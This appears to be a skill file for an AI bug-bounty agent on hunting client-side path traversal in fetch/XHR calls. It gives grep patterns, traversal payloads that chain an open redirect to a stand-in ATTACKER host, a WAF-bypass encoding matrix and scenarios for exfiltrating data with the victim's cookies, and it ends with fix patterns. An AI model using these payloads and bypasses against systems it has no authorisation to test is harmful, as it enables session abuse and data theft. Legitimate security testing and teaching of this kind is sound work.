---
name: hunt-cspt
description: "TRIGGER — JS source (fetch()/XHR/axios call) concatenates attacker-controlled input unencoded into the URL PATH segment (not the query string). SKIP — hunt-open-redirect once the traversal lands on a full off-origin URL redirect rather than a same-origin fetch path; hunt-xss/hunt-dom once the endpoint reached by the traversal leads directly to script execution — log the confirmed chain there instead."
sources: matanber_blog (cspt-levels), securityfortech_hacking-skills
report_count: 0
---

# HUNT-CSPT — Client-Side Path Traversal

## Crown Jewel Targets

CSPT executes in the victim's browser, but unlike DOM-XSS it abuses the **path** of an
authenticated `fetch()`/`XHR` — so the redirected request carries the victim's cookies to a
same-origin endpoint the attacker chose. Highest-value chains:

- **CSPT → open redirect → DOM-XSS** — traversal points `fetch()` at an in-app open-redirect
  gadget; `fetch()` auto-follows the 302 cross-origin to an attacker host that returns crafted
  JSON, which the SPA renders into a dangerous DOM sink (`innerHTML`/`eval`) → XSS with no
  server-side payload for a WAF to catch.
- **CSPT → internal-endpoint access** — traversal reaches an endpoint only reachable
  server-side (`/api/v1/admin/config`) with the victim's session cookie attached; response
  exfiltrated via an XSS gadget.
- **CSPT → forged state-change destination** — traversal rewrites where a state-changing
  `fetch()` POST lands (see `[[hunt-csrf]]`).

## Attack Surface Signals

**JavaScript source patterns (grep JS bundles):**
```js
fetch("/api/users/" + userId + "/profile")
fetch(`/api/posts/${postId}/comments`)
xhr.open("GET", "/api/data/" + param)
axios.get("/api/v1/users/" + id + "/settings")
```
- Input lands in the **path segment (before `?`)**, NOT the query string.
- No `encodeURIComponent()` around the input, or encoding applied to only some chars.
- App exposes open-redirect gadgets (`/redirect?u=`, `/oauth/authorize?redirect_uri=`,
  `/oauth/redirect?to=`).
- SPA routing inputs (URL hash/fragment, path params) fed straight into API calls.
- Response content rendered as HTML or passed to `innerHTML`/`eval()`.

## Step-by-Step Hunting Methodology

1. Map every `fetch()`/`XHR`/`axios` call in JS source — find string concatenation or template
   literals in the URL **path**.
2. Identify which parameters control the path segment (not the query string).
3. Test basic traversal: inject `../../../anything` — did the outgoing request path change?
4. Determine depth: count path segments from injection point to root or to a useful endpoint.
5. Find a usable gadget — an open redirect (`/redirect?u=ATTACKER`), or any endpoint whose
   response is reflected in the DOM.
6. Craft the final payload: traverse to the gadget, chain to an attacker-controlled response.
7. If a WAF blocks, apply the encoding-level bypass matrix below.
8. Confirm XSS or data exfiltration via an OOB callback.

## Payload & Detection Patterns

```js
// Basic CSPT test — confirm path traversal in fetch
fetch("/api/users/../../../anything")            // → request goes to /anything

// Traverse to open-redirect gadget for XSS (fetch auto-follows redirects by default)
fetch("/api/users/../../../../redirect?u=https://ATTACKER/evil.json")

// Depth calc: vuln URL /api/users/{id}/profile → 3 segments above id → 3x ../
// payload = "../../../redirect?u=https://ATTACKER/payload"
```

**grep JS source for injectable calls:**
```bash
grep -rn 'fetch(\|xhr.open\|axios.get\|axios.post' src/ | grep '+'
grep -rn 'fetch(`\|fetch("' src/ | grep '\${'
```

### WAF Encoding-Level Bypass Matrix

| Situation | Strategy | Example |
|---|---|---|
| No WAF | plain `../` | `../../../gadget` |
| WAF level = App level | encode dots | `%2e%2e/%2e%2e/%2e%2easdf` |
| WAF level < App level | over-encode slashes | `..%252f..%252f..%252fasdf` |
| WAF level > App level | pad with dummy segments | `a%252fa%252fa%252fa/../../../../asdf` |

**Depth** = (path segments) − (number of `../`). WAFs reject when depth goes negative — pad so
the WAF's computed depth stays ≥ 0 while the app's effective depth goes < 0.

```
# equal levels — encode dots
%2e%2e/%2e%2e/%2e%2eredirect?u=https://ATTACKER
# WAF level < App level — double-encode slash
..%252f..%252f..%252fredirect?u=https://ATTACKER
# WAF level > App level — pad with dummy segments WAF decodes away
a%252fa%252fa%252fa/../../../redirect?u=https://ATTACKER
```

## Bypass Techniques

- **`%2e%2e/` instead of `../`** — browser normalizes `%2e`→`.`, bypasses string-match WAFs.
- **Double-encoded slash (`%252f`)** — WAF decodes once → `%2f` (safe-looking); browser decodes
  again → `/` (traversal).
- **Mixed encoding** — `%2e%2e%252f` confuses WAFs checking for specific patterns.
- **Null byte / fragment** — some parsers stop path processing at `%00` or `#`, truncating the
  WAF depth check.
- **Redirect chaining** — if direct-domain SSRF is blocked, chain multiple open redirects on
  trusted domains.
- **`fetch()` redirect mode** — `{redirect:'follow'}` is default; attacker's cross-origin redirect
  is auto-followed.

## Exploitation Scenarios

**Scenario 1 — CSPT → open redirect → XSS.** SPA fetches `fetch("/api/posts/"+postId)` and renders
the JSON into the DOM; app has `/oauth/redirect?to=<URL>`. Attacker sets
`postId="../../../../oauth/redirect?to=https://ATTACKER/evil.json"` → `fetch()` follows redirect →
attacker returns crafted JSON with an XSS payload → rendered into DOM.

**Scenario 2 — CSPT for internal-endpoint access.** Frontend fetches `/api/v1/users/{id}/settings`,
`id` from the URL hash unencoded; `/api/v1/admin/config` is server-reachable only. Attacker injects
`../../../../admin/config` as `id` → request sent with the victim's session cookie → response
exfiltrated via the XSS gadget.

**Scenario 3 — WAF bypass via encoding mismatch.** WAF decodes once before depth-checking; app hands
the encoded URL to the browser which decodes twice. `..%252f..%252f..%252fredirect?u=https://ATTACKER`
→ WAF sees depth-0 benign, browser executes traversal → open redirect reached → XSS.

## False Positives

- Input lands in the query string (`?id=../..`) not the path — routing ignores it, no traversal.
- `encodeURIComponent()` wraps the input — `../` becomes `..%2F`, which browsers do NOT normalize
  back in the path.
- Fetch targets a static file server serving nothing sensitive at the traversed path.
- Response is never rendered or used in any DOM-modifying operation — traversal has no impact.

## Fix Patterns

```js
// WRONG: direct concatenation into path
fetch("/api/posts/" + postId + "/comments")
// CORRECT: encode the input
fetch("/api/posts/" + encodeURIComponent(postId) + "/comments")
// CORRECT: validate as a safe identifier before use
if (!/^[a-zA-Z0-9_-]+$/.test(postId)) throw new Error("Invalid ID");
fetch("/api/posts/" + postId + "/comments")
```

## Related Skills

- **`[[hunt-dom]]`** — the most common CSPT impact: traversal redirects `fetch()` to an
  attacker-controlled URL whose response hits a dangerous DOM sink (`innerHTML`). Chain primitive:
  CSPT path-rewrite + DOM sink → DOM-XSS with no server-side payload.
- **`[[hunt-csrf]]`** — CSPT can rewrite the endpoint a state-changing `fetch()` submission hits,
  forging the destination of an authenticated request.
- **`[[hunt-open-redirect]]`** — the open-redirect gadget is the pivot that turns same-origin CSPT
  into a cross-origin fetch the attacker controls; enumerate redirect gadgets first.
- **`[[hunt-lfi]]`** — the WAF encoding-bypass matrix here parallels server-side path-traversal
  URL-normalization disagreements between parser layers.
- **`[[security-arsenal]]`** — load the CSPT payload set: traversal probe, open-redirect chain
  template, and the four encoding-level WAF-bypass strings.
- **`[[triage-validation]]`** — CSPT alone (path changes) is informational; require a concrete
  XSS pop or cross-boundary read/exfil PoC before submitting.
